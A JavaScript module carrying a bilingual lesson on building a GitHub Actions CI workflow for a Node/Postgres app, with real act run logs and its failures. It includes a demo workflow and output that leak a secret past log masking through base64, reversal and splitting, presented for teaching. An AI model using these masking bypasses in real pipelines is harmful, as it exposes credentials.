/**
 * 10.1 — Lint, kiểm kiểu và test mỗi lần push (soạn 25/11/2026, agent trên Mac tiếp quản fsp).
 * Output THẬT: act 0.2.98 (nektos/act) chạy .github/workflows/ci.yml của ChiaSe trên máy nhà, ảnh runner
 * catthehacker/ubuntu:act-24.04 — KHÔNG phải GitHub thật (không đẩy repo nào lên GitHub). Ba lỗi lần chạy đầu (cổng 5432 đã có
 * Postgres khác, ngữ cảnh job ở cấp job, job.services = null ⇒ test nối nhầm vào Postgres của người khác), lượt xanh 78 s,
 * cache npm 169 MB, đỏ vì kiểu + đỏ vì IDOR kèm annotation ::error, che bí mật và ba cách lách.
 * Nguồn (GET 200 25/11/2026): GHSA-mrrh-fwg8-r2c3 (tj-actions/changed-files 14–15/03/2025), GitHub Docs Secure use reference,
 * GitHub Security Lab "Preventing pwn requests", PyPI blog Ultralytics 11/12/2024.
 */
import { lienKet, spring, nguon } from '../_chung.mjs';

const CI_DAU = `# CI của ChiaSe (Chương 10). Hai job song song: "check" (lint + kiểm kiểu + định dạng) và "test" (Vitest, Postgres thật).
# Tên job (name:) là TÊN CHECK mà branch protection bắt buộc (bài 10.3) — đổi tên ở đây phải đổi ở đó.
name: CI

on:
  push:
    branches: [main]
  pull_request: # KHÔNG dùng pull_request_target: nó chạy mã của PR với quyền + secret của repo (bài 10.1, góc hacker)

# Quyền tối thiểu cho GITHUB_TOKEN: chỉ đọc mã. Job nào cần hơn thì tự xin (bài 10.2: packages: write).
permissions:
  contents: read

# Push mới lên cùng một PR ⇒ huỷ lượt cũ đang chạy. Trên main thì KHÔNG huỷ: mỗi commit main phải có kết quả riêng.
concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: \${{ github.event_name == 'pull_request' }}

jobs:
  check:
    name: check
    runs-on: ubuntu-latest
    timeout-minutes: 10 # mặc định là 360 phút: một bước treo đốt 6 giờ runner
    steps:
      # Ghim action theo mã commit đầy đủ, không theo tag: tag di chuyển được (vụ tj-actions/changed-files, 03/2025).
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false # không để token nằm trong .git/config cho các bước sau
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version-file: .nvmrc
          cache: npm # cache ~/.npm theo băm package-lock.json
      - run: npm ci
      - run: npm run check

  test:
    name: test
    runs-on: ubuntu-latest
    timeout-minutes: 15
    services:
      postgres:
        image: postgres:18-alpine
        env:
          POSTGRES_USER: chiase
          POSTGRES_PASSWORD: chiase
          POSTGRES_DB: chiase
        # Cổng máy 41855 (không phải 5432): máy chạy act đã có một Postgres khác ở 5432. Trên GitHub cách "chuẩn" là
        # cổng ngẫu nhiên + job.services.postgres.ports[5432], nhưng act để job.services = null (đo 25/11) ⇒ cổng cố định
        # chạy được ở CẢ HAI nơi (runner GitHub là máy ảo mới tinh, 41855 luôn trống).
        ports:
          - 41855:5432
        # Runner chờ service "healthy" rồi mới chạy bước đầu tiên.
        options: &gt;-
          --health-cmd "pg_isready -h 127.0.0.1 -U chiase -d chiase"
          --health-interval 2s --health-timeout 5s --health-retries 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm test
        env:
          # Có TEST_DATABASE_URL ⇒ globalSetup (test/pg-mot-lan.ts) KHÔNG tự bật Docker, dùng service này.
          TEST_DATABASE_URL: postgresql://chiase:chiase@localhost:41855/chiase`;

const CONG = `[CI/check]   ✅  Success - Main npm ci [24.760272324s]
[CI/check] 🏁  Job succeeded
Error: failed to start container: Error response from daemon: failed to set up container networking: driver failed programming external connectivity on endpoint act-CI-test-…: failed to bind host port 0.0.0.0:5432/tcp: address already in use`;

const NHAM = `[CI/test]   | Loaded Prisma config from prisma.config.ts.
[CI/test]   | Prisma schema loaded from prisma/schema.prisma.
[CI/test]   | Error: P1010: User was denied access on the database \`chiase\`
[CI/test]   | No test files found, exiting with code 1
[CI/test]   | ', 'Loaded Prisma config from prisma.config.ts.
[CI/test]   | ', stderr: 'Loaded Prisma config from prisma.config.ts.
[CI/test]   ❌  Failure - Main npm test [7.487942107s]
[CI/test] 🏁  Job failed
Error: Job 'test' failed`;

const DV = `name: dv
on: push
jobs:
  dv:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:18-alpine
        env: { POSTGRES_PASSWORD: x }
        ports: ["5432"]
    steps:
      - run: echo "JOB=\${{ toJSON(job) }}"
      - run: docker ps --format "{{.Names}} {{.Ports}}" 2&gt;/dev/null | grep act- || echo "không có docker trong job"`;

const JOB_SV = ``;

const XANH = `[CI/check] ⭐ Run Main actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
[CI/check]   ✅  Success - Main actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 [1.408583404s]
[CI/check] ⭐ Run Main actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1
[CI/check]   | node: v22.23.2
[CI/check]   | npm: 10.9.8
[CI/check]   | Cache restored successfully
[CI/check]   | Cache restored from key: node-cache-linux-x64-npm-826f0b3ba0e1ebc08ca10d1ca98f1a9483d58f8f39282d5b8b628a93e66cb489
[CI/check]   ✅  Success - Main actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 [4.387900155s]
[CI/check] ⭐ Run Main npm ci
[CI/test ] ⭐ Run Main actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
[CI/test ]   ✅  Success - Main actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 [382.624831ms]
[CI/test ] ⭐ Run Main actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1
[CI/test ]   | node: v22.23.2
[CI/test ]   | npm: 10.9.8
[CI/test ]   | Cache restored successfully
[CI/test ]   | Cache restored from key: node-cache-linux-x64-npm-826f0b3ba0e1ebc08ca10d1ca98f1a9483d58f8f39282d5b8b628a93e66cb489
[CI/test ]   ✅  Success - Main actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 [4.67513904s]
[CI/test ] ⭐ Run Main npm ci
[CI/check]   | added 424 packages, and audited 427 packages in 20s
[CI/check]   ✅  Success - Main npm ci [20.19529941s]
[CI/check] ⭐ Run Main npm run check
[CI/test ]   | added 424 packages, and audited 427 packages in 17s
[CI/test ]   ✅  Success - Main npm ci [17.302233883s]
[CI/test ] ⭐ Run Main npm test
[CI/check]   ✅  Success - Main npm run check [9.148277694s]
[CI/check]   | Cache saved successfully
[CI/check]   | Cache saved with the key: node-cache-Linux-x64-npm-826f0b3ba0e1ebc08ca10d1ca98f1a9483d58f8f39282d5b8b628a93e66cb489
[CI/test ]   | [pg-test] migrate deploy 3701 ms
[CI/check] 🏁  Job succeeded
[CI/test ]   |  Test Files  17 passed (17)
[CI/test ]   |       Tests  106 passed (106)
[CI/test ]   |    Duration  24.71s (tests 47%, import 25%, setup 22%, transform 5%)
[CI/test ]   ✅  Success - Main npm test [26.936377551s]
- **Test Files**: ✅ **17 passes** · 17 total
[CI/test ]   | Cache saved successfully
[CI/test ]   | Cache saved with the key: node-cache-Linux-x64-npm-826f0b3ba0e1ebc08ca10d1ca98f1a9483d58f8f39282d5b8b628a93e66cb489
[CI/test ] 🏁  Job succeeded`;

const DO_KIEU = `[CI/check] ⭐ Run Main npm run check
[CI/check]   | &gt; tsc -p tsconfig.json --noEmit &amp;&amp; tsc -p tsconfig.test.json
[CI/check]   | src/lib/http-error.ts(18,14): error TS2322: Type 'string' is not assignable to type 'number'.
[CI/check]   | &gt; tsc -b
[CI/check]   ❌  Failure - Main npm run check [3.01080664s]
[CI/check] 🏁  Job failed
Error: Job 'check' failed`;

const DO_TEST = `[CI/test]   |      × Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL 345ms
[CI/test]   |      × bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại") 198ms
[CI/test]   |      ✓ bom điểm ảnh: 8000×5001 (&gt; 40 triệu điểm) ⇒ 400 ANH_QUA_LON trước khi giải mã hết 457ms
[CI/test]   |  FAIL   tich-hop  test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL
[CI/test]   | Error: expected 403 "Forbidden", got 200 "OK"
[CI/test]   |  FAIL   tich-hop  test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
[CI/test]   | Error: expected 404 "Not Found", got 200 "OK"
[CI/test]   |  Test Files  1 failed | 16 passed (17)
[CI/test]   |       Tests  2 failed | 104 passed (106)
[CI/test]   ❗  ::error file=/…/chiase/apps/api/test/api/bao-ve.api.test.ts,title=[tich-hop] test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403%2C bài KHÔNG đổi trong CSDL,line=57,column=8::Error: expected 403 "Forbidden", got 200 "OK"%0A ❯ test/api/bao-ve.api.test.t
[CI/test]   ❗  ::error file=/…/chiase/apps/api/test/api/bao-ve.api.test.ts,title=[tich-hop] test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An%3A Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại"),line=75,column=8::Error: expected 404 "Not Found", got 200 "OK"%0A ❯ test/ap
[CI/test]   ❌  Failure - Main npm test [24.575052129s]
- **Test Files**: ❌ **1 failure** · ✅ **16 passes** · 17 total
[CI/test] 🏁  Job failed
Error: Job 'test' failed`;

const BI_MAT = `name: lo-bi-mat
on: push
permissions:
  contents: read
jobs:
  lo:
    runs-on: ubuntu-latest
    steps:
      - name: In thẳng secret
        run: echo "khoá là \${{ secrets.DEMO_KEY }}"
      - name: In secret đã đổi dạng (base64, đảo chuỗi, cắt đôi)
        env:
          K: \${{ secrets.DEMO_KEY }}
        run: |
          echo "base64: $(printf %s "$K" | base64)"
          echo "đảo:    $(printf %s "$K" | rev)"
          echo "nửa 1:  \${K:0:12}"
          echo "nửa 2:  \${K:12}"
      - name: Ghi ra tệp rồi đọc lại bằng cat
        env:
          K: \${{ secrets.DEMO_KEY }}
        run: printf %s "$K" &gt; k.txt &amp;&amp; cat k.txt &amp;&amp; echo`;

const LO = `[lo-bi-mat/lo]   | khoá là ***
[lo-bi-mat/lo]   | base64: c2stZ2lhLWNoaS1kZS10aHUtMDEyMzQ1Njc4OWFiY2RlZg==
[lo-bi-mat/lo]   | đảo:    fedcba9876543210-uht-ed-ihc-aig-ks
[lo-bi-mat/lo]   | nửa 1:  sk-gia-chi-d
[lo-bi-mat/lo]   | nửa 2:  e-thu-0123456789abcdef
[lo-bi-mat/lo]   | ***`;

const DO_DAY = `[CI/test] ⭐ Run Main npm test
[CI/test]   🐳  docker exec cmd=[bash -e /var/run/act/workflow/3] user= workdir=

&gt; test
&gt; npm test -w apps/api


&gt; api@0.0.0 test
&gt; vitest run


 RUN  v5.1.1 /…/chiase/apps/api

[pg-test] migrate deploy 2980 ms
Loaded Prisma config from prisma.config.ts.

Prisma schema loaded from prisma/schema.prisma.
┌─────────────────────────────────────────────────────────┐
│  Update available 7.10.1 -&gt; 8.0.0-rc.35                 │
│                                                         │
│  This is a major update - please follow the guide at    │
│  https://pris.ly/d/major-version-upgrade                │
│                                                         │
│  Run the following to update                            │
│    npm i --save-dev prisma@latest                       │
│    npm i @prisma/client@latest                          │
└─────────────────────────────────────────────────────────┘
stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL
2026-11-25T03:55:28.754Z 23d31ec2-9ac4-498c-ad99-489bba4963b9 POST /api/auth/login 200 82.7ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL
2026-11-25T03:55:28.828Z 7e10750d-700d-4a1e-b334-65f437190c89 POST /api/auth/login 200 62.4ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL
2026-11-25T03:55:28.887Z a0221cb1-01be-49bc-a705-d1e44c24f1f1 POST /api/posts 201 55.9ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL
2026-11-25T03:55:28.923Z 1d03b0b6-2e0d-42f4-bc59-df02ffb1a147 PATCH /api/posts/01a210d8-1ecd-7894-9641-3846313b1c3d 200 33.4ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
2026-11-25T03:55:29.015Z 8e76615f-578b-4676-b1cc-e98691acfd06 POST /api/auth/login 200 50.1ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
2026-11-25T03:55:29.072Z 1c437be5-0cf6-4c6a-82d2-b494b6e81c9b POST /api/auth/login 200 46.9ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
2026-11-25T03:55:29.097Z 373c23ce-58be-4195-8c45-d39cb1cd11a1 POST /api/posts 201 22.3ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
2026-11-25T03:55:29.107Z 526bcee1-4b78-47c4-8f8b-efdb5afb53b0 GET /api/posts/01a210d8-1fba-714c-a5c6-63bfb97c8a1c 404 7.4ms

stdout | test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
2026-11-25T03:55:29.126Z 73245afd-c17c-42bb-bb79-73fc91a1fdf0 PATCH /api/posts/01a210d8-1fba-714c-a5c6-63bfb97c8a1c 200 17.2ms

 ❯  tich-hop  test/api/bao-ve.api.test.ts (17 tests | 2 failed) 1179ms
   ✓ xác thực (12)
     ✓ get /api/me không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 175ms
     ✓ get /api/users/00000000-0000-4000-8000-000000000001/sessions không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 21ms
     ✓ post /api/posts không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 29ms
     ✓ patch /api/posts/00000000-0000-4000-8000-000000000001 không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 21ms
     ✓ delete /api/posts/00000000-0000-4000-8000-000000000001 không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 23ms
     ✓ post /api/uploads không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 21ms
     ✓ post /api/posts/00000000-0000-4000-8000-000000000001/comments không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 23ms
     ✓ delete /api/comments/00000000-0000-4000-8000-000000000001 không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 26ms
     ✓ put /api/posts/00000000-0000-4000-8000-000000000001/like không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 25ms
     ✓ delete /api/posts/00000000-0000-4000-8000-000000000001/like không token ⇒ 401 CHUA_DANG_NHAP + WWW-Authenticate 21ms
     ✓ token rác ⇒ 401 TOKEN_KHONG_HOP_LE 21ms
     ✓ đường dẫn không tồn tại ⇒ 404, KHÔNG phải 401 (lỗi apiRouter.use(requireAuth) ở bài 3.3) 28ms
   ❯ phân quyền bài viết (IDOR) (4)
     × Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL 345ms
     × bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại") 198ms
     ✓ gửi kèm authorId để "đăng hộ" người khác ⇒ 400 (z.strictObject), không âm thầm bỏ qua 155ms
     ✓ id không phải uuid ⇒ 404 KHONG_TIM_THAY ngay ở middleware, không phải 500 (bài 4.1) 21ms
   ✓ lỗi máy chủ (1)
     ✓ CSDL ném lỗi lạ ⇒ 500 LOI_MAY_CHU, client KHÔNG thấy chi tiết; log có requestId để tra 20ms
 ✓  tich-hop  test/api/realtime.api.test.ts (4 tests) 940ms
   ✓ realtime qua socket thật (4)
     ✓ khách đang xem bài nhận bình luận mới; người xem bài KHÁC thì không 660ms
 ✓  tich-hop  test/api/auth.api.test.ts (7 tests) 915ms
   ✓ POST /api/auth/register (3)
     ✓ 202, và email TRÙNG nhận đúng cùng câu trả lời (không dò được email nào có tài khoản) 329ms
 ✓  tich-hop  test/api/binh-luan-thich.api.test.ts (4 tests) 919ms
   ✓ bình luận qua HTTP (3)
     ✓ tạo 201 ⇒ GET danh sách thấy, commentCount của bài tăng; khách đọc được không cần token 416ms
 ✓  tich-hop  test/tich-hop/binh-luan.test.ts (5 tests) 487ms
 ✓  tich-hop  test/tich-hop/feed.test.ts (4 tests) 595ms
 ✓  tich-hop  test/api/nguoi-dung.api.test.ts (6 tests) 704ms
 ✓  tich-hop  test/tich-hop/auth.test.ts (3 tests) 344ms
 ✓  tich-hop  test/api/gioi-han.api.test.ts (1 test) 227ms
 ✓  unit  test/unit/auth.service.test.ts (9 tests) 182ms
 ✓  unit  test/unit/image.service.test.ts (10 tests) 597ms
   ✓ duyetAnh (6)
     ✓ bom điểm ảnh: 8000×5001 (&gt; 40 triệu điểm) ⇒ 400 ANH_QUA_LON trước khi giải mã hết 457ms
 ✓  unit  test/unit/comment.service.test.ts (7 tests) 14ms
 ✓  unit  test/unit/like.service.test.ts (5 tests) 19ms
 ✓  unit  test/unit/cursor.test.ts (10 tests) 11ms
 ✓  unit  test/unit/tokens.test.ts (7 tests) 29ms
 ✓  unit  test/unit/password.test.ts (5 tests) 244ms
 ✓  unit  test/unit/health.service.test.ts (2 tests) 9ms

⎯⎯⎯⎯⎯⎯⎯ Failed Tests 2 ⎯⎯⎯⎯⎯⎯⎯

 FAIL   tich-hop  test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL
Error: expected 403 "Forbidden", got 200 "OK"
 ❯ test/api/bao-ve.api.test.ts:57:8
     55|       .set(bearer(binh.token))
     56|       .send({ title: 'Bị sửa' })
     57|       .expect(403);
       |        ^
     58|     await request(app).delete(\`/api/posts/\${bai.body.id}\`).set(bearer(…
     59|     expect(await prisma.post.findUnique({ where: { id: bai.body.id } }…
 ❯ Test._assertStatus ../../node_modules/supertest/lib/test.js:535:14
 ❯ ../../node_modules/supertest/lib/test.js:591:13
 ❯ Test._assertFunction ../../node_modules/supertest/lib/test.js:568:13
 ❯ Test.assert ../../node_modules/supertest/lib/test.js:432:23
 ❯ localAssert ../../node_modules/supertest/lib/test.js:382:38
 ❯ Server.&lt;anonymous&gt; ../../node_modules/supertest/lib/test.js:126:7

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[1/2]⎯

 FAIL   tich-hop  test/api/bao-ve.api.test.ts &gt; phân quyền bài viết (IDOR) &gt; bài nháp của An: Bình GET/PATCH ⇒ 404 (không xác nhận "bài có tồn tại")
Error: expected 404 "Not Found", got 200 "OK"
 ❯ test/api/bao-ve.api.test.ts:75:8
     73|       .set(bearer(binh.token))
     74|       .send({ title: 'y' })
     75|       .expect(404);
       |        ^
     76|   });
     77|
 ❯ Test._assertStatus ../../node_modules/supertest/lib/test.js:535:14
 ❯ ../../node_modules/supertest/lib/test.js:591:13
 ❯ Test._assertFunction ../../node_modules/supertest/lib/test.js:568:13
 ❯ Test.assert ../../node_modules/supertest/lib/test.js:432:23
 ❯ localAssert ../../node_modules/supertest/lib/test.js:382:38
 ❯ Server.&lt;anonymous&gt; ../../node_modules/supertest/lib/test.js:126:7

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[2/2]⎯


 Test Files  1 failed | 16 passed (17)
      Tests  2 failed | 104 passed (106)
   Start at  03:55:22
   Duration  22.96s (tests 42%, import 25%, setup 24%, transform 9%)



npm error Lifecycle script \`test\` failed with error:
npm error code 1
npm error path /…/chiase/apps/api
npm error workspace api@0.0.0
npm error location /…/chiase/apps/api
npm error command failed
npm error command sh -c vitest run
[CI/test]   ❌  Failure - Main npm test [24.575052129s]
[CI/test]   ⚙  Summary - ## Vitest Test Report

### Summary

- **Test Files**: ❌ **1 failure** · ✅ **16 passes** · 17 total
- **Test Results**: ❌ **2 failures** · ✅ **104 passes** · 106 total
[CI/test] exitcode '1': failure
[CI/test] ⭐ Run Complete job
[CI/test]   ✅  Success - Complete job
[CI/test] 🏁  Job failed`;


const NGUON = [
  nguon('🛡️', 'GitHub Advisory GHSA-mrrh-fwg8-r2c3 — tj-actions/changed-files (03/2025)', 'github.com/advisories', 'https://github.com/advisories/GHSA-mrrh-fwg8-r2c3'),
  nguon('🛡️', 'GitHub Security Lab — Preventing pwn requests (pull_request_target)', 'securitylab.github.com', 'https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/'),
  nguon('🐍', 'PyPI blog — Supply-chain attack analysis: Ultralytics (12/2024)', 'blog.pypi.org', 'https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/'),
  nguon('📘', 'GitHub Docs — Secure use reference (ghim SHA, dữ liệu có cấu trúc làm secret)', 'docs.github.com', 'https://docs.github.com/en/actions/reference/security/secure-use'),
  nguon('📘', 'GitHub Docs — Creating PostgreSQL service containers', 'docs.github.com', 'https://docs.github.com/en/actions/tutorials/use-containerized-services/create-postgresql-service-containers'),
  nguon('🧰', 'act — chạy GitHub Actions trên máy của bạn', 'nektosact.com', 'https://nektosact.com/'),
].join('\n');

const THE = [
  lienKet({ khoa: 'github-actions', bai: 'ga-0-2-bon-tang', title: 'GitHub Actions 0.2 — Workflow, job, bước, runner', sub: 'Bốn tầng mà tệp ci.yml của bài này dùng.', cta: 'Mở bài →' }),
  lienKet({ khoa: 'github-actions', bai: 'ga-4-2-ghim', title: 'GitHub Actions 4.2 — @v4 là một CON TRỎ, không phải một phiên bản', sub: 'Vì sao mọi uses: ở đây ghim mã commit 40 ký tự.', cta: 'Mở bài →' }),
  lienKet({ khoa: 'github-actions', bai: 'ga-5-1-cache-mua-gi', title: 'GitHub Actions 5.1 — Một cái cache thật sự mua được gì', sub: 'cache: npm mua được bao nhiêu giây, đo kỹ hơn.', cta: 'Mở bài →' }),
  lienKet({ khoa: 'github-actions', bai: 'ga-6-1-che-bi-mat', title: 'GitHub Actions 6.1 — Che bí mật phủ ĐÚNG chuỗi đã lưu', sub: 'Ba cách lách che bí mật đã chạy ở mục 6.', cta: 'Mở bài →' }),
  lienKet({ khoa: 'github-actions', bai: 'ga-14-2-bao-mat-chuoi-cung-ung', title: 'GitHub Actions 14.2 — pull_request_target, tiêm lệnh, chuỗi cung ứng', sub: 'Góc hacker của bài này, đầy đủ.', cta: 'Mở bài →' }),
  lienKet({ khoa: 'nodejs', bai: 'nodejs-14-5-do-phu-flaky-ci', title: 'Node.js 14.5 — Độ phủ, test chập chờn và CI', sub: 'Khi test xanh ở máy mà đỏ trên CI.', cta: 'Mở bài →' }),
].join('\n');

export default {
  title: '10.1 — Lint, typecheck and test on every push|||10.1 — Lint, kiểm kiểu và test mỗi lần push',
  slug: 'fp-10-1-ci-co-ban',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Viết workflow GitHub Actions đầu tiên cho ChiaSe: hai job song song "check" (oxlint + tsc + prettier) và "test" (106 test Vitest trên một Postgres 18 thật chạy dạng service container), quyền tối thiểu, action ghim theo mã commit, cache npm, timeout, huỷ lượt cũ của PR. Chạy THẬT bằng act trên máy: lần đầu gặp ba lỗi (cổng 5432 đã có Postgres khác; ngữ cảnh job dùng sai cấp; job.services rỗng ⇒ test nối nhầm vào CSDL của người khác), rồi xanh trong 78 giây. Cố tình làm đỏ bằng lỗi kiểu và bằng lỗi IDOR để xem annotation. Góc hacker: che bí mật trong log và ba cách lách (base64 — đúng thứ vụ tj-actions/changed-files 2025 làm), pull_request_target và vụ Ultralytics 2024.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · CI</span>
<h2>A robot that runs your checklist on every push</h2>
<p class="lead">You already have the checklist: <code>npm run check</code> (lint, types, formatting) and <code>npm test</code> (106 tests against a real Postgres). The problem is that humans skip it — "just a one-line change". Continuous Integration is a machine that runs the same commands on a <em>fresh</em> computer for every push and every pull request, and writes the result next to the commit where nobody can ignore it. This lesson writes that machine for ChiaSe and runs it for real.</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">event</span><span class="lz-d">push to main, or any pull request</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">fresh runner</span><span class="lz-d">a brand-new Ubuntu VM per job: no node_modules, no .env, no cache you did not ask for</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">check ∥ test</span><span class="lz-d">two jobs in parallel; test gets its own Postgres service</span></div>
<div class="lz-step"><span class="lz-k">4</span><span class="lz-t">status</span><span class="lz-d">✅/❌ on the commit and the PR; annotations on the failing line</span></div>
</div>

<h3>1. Where the output in this chapter comes from</h3>
<p>Every log below was produced by <strong>act 0.2.98</strong> (nektos/act) on the course machine: act reads <code>.github/workflows/*.yml</code> and runs each job in a Docker container that imitates GitHub's Ubuntu runner (image <code>catthehacker/ubuntu:act-24.04</code>). Nothing was pushed to GitHub. That is deliberate — you can run your CI before you even have a GitHub repo — but act is <em>not</em> GitHub, and section 4 shows three places where it differs. On GitHub itself the steps are: create an empty repo, <code>git remote add origin git@github.com:&lt;you&gt;/chiase.git</code>, <code>git push -u origin main</code>, then open the <em>Actions</em> tab; the workflow starts by itself because the file is in <code>.github/workflows/</code>.</p>

<h3>2. The workflow</h3>
<pre><code class="language-yaml">${CI_DAU}</code></pre>
<p>Read it top to bottom, each line is a decision:</p>
<ul>
<li><strong><code>on:</code></strong> — <code>push</code> only for <code>main</code> (feature branches are covered by their PR, no need to run twice), and <code>pull_request</code> for every PR. <code>pull_request</code> runs the PR's code with a <em>read-only</em> token and, for forks, <em>no secrets</em>. Its dangerous cousin <code>pull_request_target</code> is in the hacker's corner below.</li>
<li><strong><code>permissions: contents: read</code></strong> — the automatic <code>GITHUB_TOKEN</code> of each run can only read code. A compromised step cannot push, open releases or write packages. Lesson 10.2 grants <code>packages: write</code> to one job only.</li>
<li><strong><code>concurrency</code></strong> — three pushes to the same PR in a minute ⇒ the first two runs are cancelled. Not on <code>main</code>: every commit there must keep its own result.</li>
<li><strong><code>timeout-minutes</code></strong> — the default is 360. A test waiting forever for a database burns six hours of runner time before anyone notices.</li>
<li><strong>Pinned actions</strong> — <code>actions/checkout@3d3c42e…</code> instead of <code>@v7</code>. A tag is a pointer the owner (or an attacker with their token) can move; a 40-character commit hash cannot be moved.</li>
<li><strong><code>persist-credentials: false</code></strong> — by default checkout writes the token into <code>.git/config</code>, readable by every later step, including <code>npm ci</code>'s install scripts.</li>
<li><strong><code>services: postgres</code></strong> — a real <code>postgres:18-alpine</code> next to the job, with a health check: the runner waits until it is healthy before the first step. <code>TEST_DATABASE_URL</code> tells our <code>globalSetup</code> (lesson 8.2) to use it instead of starting its own Docker container.</li>
</ul>

<h3>3. Why <code>npm ci</code>, and what <code>cache: npm</code> really caches</h3>
<p><code>npm ci</code> installs <em>exactly</em> the lockfile, deletes <code>node_modules</code> first and fails if <code>package.json</code> and the lockfile disagree — the reproducibility a CI needs (<code>npm install</code> may quietly update the lockfile). <code>cache: npm</code> caches <code>~/.npm</code>, npm's download cache, keyed by the hash of <code>package-lock.json</code> — not <code>node_modules</code>. Measured: the first run saved a 169 MB cache; with it restored, <code>npm ci</code> went from 24.8 s to 16–20 s. The rest is unpacking 424 packages and our <code>postinstall</code> (<code>prisma generate</code>), which no download cache can skip. On a slow network the saving is bigger; on this machine's fibre it is modest — measure before you promise speed-ups.</p>

<h3>4. First runs: three failures, one of them dangerous</h3>
<p><strong>Failure 1 — the port.</strong> The first version had <code>ports: [5432:5432]</code>, copied from every tutorial:</p>
<div class="out">${CONG}</div>
<p>The course machine already runs another Postgres on 5432. On a GitHub runner (a fresh VM) 5432 is always free; on a self-hosted runner or with act it is not. The textbook fix is a random host port (<code>ports: [5432]</code>) plus <code>\${{ job.services.postgres.ports['5432'] }}</code>.</p>
<p><strong>Failure 2 — the context level.</strong> Putting that expression in <code>jobs.test.env</code> was rejected before anything ran: <code>Unknown Variable Access job</code>. The <code>job</code> context does not exist at job level; it exists in <em>steps</em>. act validated what GitHub would also have refused.</p>
<p><strong>Failure 3 — the dangerous one.</strong> Moved to the step, the run reached the tests and failed like this:</p>
<div class="out">${NHAM}</div>
<p>"Denied access" means <em>something answered</em> — but our service was not on 5432 any more. To find out, a two-step probe workflow:</p>
<pre><code class="language-yaml">${DV}</code></pre>
<div class="out">${JOB_SV}</div>
